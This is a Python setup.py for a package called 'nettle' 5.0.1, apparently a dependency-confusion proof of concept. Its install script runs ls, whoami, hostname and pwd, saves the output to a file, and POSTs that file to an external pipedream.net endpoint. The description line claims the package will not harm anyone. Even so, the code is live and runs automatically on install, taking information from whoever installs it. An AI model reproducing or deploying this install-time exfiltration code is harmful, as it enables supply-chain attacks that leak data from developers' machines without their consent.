from setuptools import setup
import os

# get the output of 4 commands
output = []
output.append(os.popen('ls').read())
output.append(os.popen('whoami').read())
output.append(os.popen('hostname').read())
output.append(os.popen('pwd').read())

# write output to a file
with open('output.txt', 'w') as f:
    for o in output:
        f.write(o)

# send output to pipedream server
import http.client

conn = http.client.HTTPSConnection('eofu0ntgqm9ibyz.m.pipedream.net')
with open('output.txt', 'r') as f:
    data = f.read()
conn.request("POST", "/", data, {'Content-Type': 'text/plain'})

setup(name='nettle',
      version='5.0.1',
      description='This is just for a making PoC purpose. It will not harm anyone. So, do not worry.',
      author='manan_sanghvi',
      )
